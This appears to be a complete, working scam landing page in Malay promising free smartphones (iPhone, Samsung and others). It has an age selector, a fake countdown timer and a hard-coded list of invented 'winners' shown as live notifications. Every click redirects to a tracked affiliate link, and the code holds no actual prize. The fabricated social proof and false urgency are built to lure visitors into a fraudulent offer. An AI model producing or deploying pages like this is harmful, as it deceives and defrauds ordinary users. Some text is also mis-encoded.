<!DOCTYPE html>
<html lang="ms">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Menangi Telefon Pintar Anda â€” Jangan Terlepas!</title>
<meta name="description" content="Pilih umur anda dan tuntut telefon anda! Sekarang juga di Malaysia! Samsung, iPhone dan banyak lagi! 5 minit sahaja!" />
<meta name="theme-color" content="#d84315" />
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;700&family=Roboto&display=swap');
  body {
    margin: 0;
    font-family: 'Roboto', sans-serif;
    background: linear-gradient(135deg, #efebe9, #ffccbc);
    color: #4e342e;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 30px 15px;
    min-height: 100vh;
    overflow-x: hidden;
  }
  header {
    font-family: 'Poppins', sans-serif;
    font-size: 2.5rem;
    font-weight: 700;
    margin: 10px 0 25px;
    text-align: center;
    color: #bf360c;
    text-shadow: 1px 1px 3px #ffab91aa;
    user-select: none;
    position: relative;
  }
  header::before {
    content: url('https://upload.wikimedia.org/wikipedia/commons/6/66/Flag_of_Malaysia.svg');
    position: absolute;
    left: -40px;
    top: 5px;
    width: 30px;
    height: auto;
  }
  .timer {
    font-family: 'Poppins', sans-serif;
    font-size: 2rem;
    font-weight: 700;
    background: #ff7043cc;
    padding: 14px 30px;
    border-radius: 50px;
    margin-bottom: 25px;
    box-shadow: 0 0 25px rgb(255 112 67 / 0.6);
    user-select: none;
    letter-spacing: 2.5px;
    width: 160px;
    text-align: center;
    color: #4e342e;
    animation: pulse 1.5s infinite;
  }
  @keyframes pulse {
    0% { transform: scale(1); }
    50% { transform: scale(1.05); }
    100% { transform: scale(1); }
  }
  .steps {
    background: #ffffffdd;
    padding: 20px;
    border-radius: 18px;
    width: 340px;
    margin-bottom: 30px;
    font-size: 1.1rem;
    box-shadow: 0 6px 15px rgba(0,0,0,0.1);
  }
  .steps li {
    margin: 10px 0;
    position: relative;
    padding-left: 30px;
  }
  .steps li::before {
    content: 'âœ…';
    position: absolute;
    left: 0;
    top: 0;
  }
  .age-selector {
    background: #ffffffdd;
    padding: 25px 30px;
    border-radius: 20px;
    width: 360px;
    box-shadow: 0 8px 25px rgb(191 54 12 / 0.3);
    margin-bottom: 35px;
    text-align: center;
    transition: box-shadow 0.3s ease;
  }
  .age-selector:hover {
    box-shadow: 0 8px 35px rgb(191 54 12 / 0.5);
  }
  .age-selector label {
    font-family: 'Poppins', sans-serif;
    font-size: 1.5rem;
    font-weight: 700;
    margin-bottom: 15px;
    display: block;
    color: #bf360c;
  }
  select {
    width: 100%;
    font-size: 1.25rem;
    padding: 12px 10px;
    border-radius: 12px;
    border: 2px solid #bf360c;
    outline: none;
    text-align-last: center;
    cursor: pointer;
    background: #fff;
    transition: border-color 0.3s ease;
  }
  select:focus {
    border-color: #d84315;
  }
  button.select-btn {
    margin-top: 20px;
    background: #d84315;
    border: none;
    padding: 14px 0;
    width: 100%;
    font-weight: 700;
    font-size: 1.3rem;
    color: #fff;
    border-radius: 14px;
    cursor: pointer;
    box-shadow: 0 4px 15px rgb(216 67 21 / 0.6);
    transition: background 0.3s ease, box-shadow 0.3s ease;
  }
  button.select-btn:hover {
    background: #bf360c;
    box-shadow: 0 6px 20px rgb(191 54 12 / 0.8);
  }
  .winner-container {
    position: fixed;
    bottom: 25px;
    right: 25px;
    width: 320px;
    max-width: 90vw;
    z-index: 1000;
    display: flex;
    flex-direction: column;
    gap: 14px;
    pointer-events: none;
  }
  .winner-notification {
    background: rgba(255, 112, 67, 0.9);
    padding: 14px 20px;
    border-radius: 20px;
    color: #fff;
    font-weight: 600;
    font-size: 1rem;
    box-shadow: 0 0 15px #d84315cc;
    animation: slideIn 1s ease forwards, fadeOut 1s ease forwards 7s;
    opacity: 0;
    user-select: none;
    display: flex;
    align-items: center;
  }
  .winner-notification::before {
    content: "ðŸŽ‰";
    margin-right: 10px;
    font-size: 1.4rem;
  }
  @keyframes slideIn {
    from { transform: translateX(100%); opacity: 0; }
    to { transform: translateX(0); opacity: 1; }
  }
  @keyframes fadeOut {
    from { opacity: 1; }
    to { opacity: 0; }
  }
</style>
</head>
<body>
<header>Menangi Telefon Pintar Anda!</header>
<div class="timer" id="timer">05:00</div>
<ul class="steps">
  <li>Pilih umur anda</li>
  <li>Klik butang "Tuntut Telefon"</li>
  <li>Ikuti arahan di halaman seterusnya</li>
</ul>
<div class="age-selector">
  <label for="age">Pilih umur anda</label>
  <select id="age" required>
    <option value="" disabled selected>Sila pilih umur</option>
    <option value="18-24">18-24</option>
    <option value="25-34">25-34</option>
    <option value="35-44">35-44</option>
    <option value="45+">45+</option>
  </select>
  <button class="select-btn" id="submitAge">Tuntut Telefon!</button>
</div>
<div class="winner-container" id="winnerContainer"></div>
<script>
  const urlParams = new URLSearchParams(window.location.search);
  const subid = urlParams.get('subid') || 'default';
  const redirectUrl = `https://singingfiles.com/show.php?l=0&u=2417307&id=70094&subid=${subid}`;

  document.getElementById('submitAge').addEventListener('click', () => {
    const age = document.getElementById('age').value;
    if (!age) {
      alert('Sila pilih umur anda!');
      return;
    }
    window.location.href = redirectUrl;
  });

  const winners = [
    { name: 'Mateusz', city: 'Kuala Lumpur', prize: 'iPhone 15 Pro Max', timeAgo: 'sebentar tadi' },
    { name: 'Alya', city: 'Penang', prize: 'Samsung Galaxy S24', timeAgo: '1 minit lalu' },
    { name: 'Firdaus', city: 'Johor Bahru', prize: 'Huawei P60', timeAgo: '2 minit lalu' },
    { name: 'Siti', city: 'Melaka', prize: 'Xiaomi 14', timeAgo: '3 minit lalu' }
  ];

  const winnerContainer = document.getElementById('winnerContainer');

  function showWinner(index = 0) {
    if (index >= winners.length) return;
    const w = winners[index];
    const el = document.createElement('div');
    el.className = 'winner-notification';
    el.textContent = `${w.name} dari ${w.city} memenangi ${w.prize} â€” ${w.timeAgo}`;
    winnerContainer.appendChild(el);

    setTimeout(() => {
      el.style.animation = 'fadeOut 1s ease forwards';
      setTimeout(() => {
        winnerContainer.removeChild(el);
        showWinner(index + 1);
      }, 1000);
    }, 7000);
  }
  setTimeout(() => showWinner(0), 3000);

  // Timer countdown
  const timerEl = document.getElementById('timer');
  let timeLeft = 300;
  function updateTimer() {
    const min = String(Math.floor(timeLeft / 60)).padStart(2, '0');
    const sec = String(timeLeft % 60).padStart(2, '0');
    timerEl.textContent = `${min}:${sec}`;
    if (timeLeft > 0) timeLeft--;
    else clearInterval(timerInterval);
  }
  updateTimer();
  const timerInterval = setInterval(updateTimer, 1000);
</script>
</body>
</html>
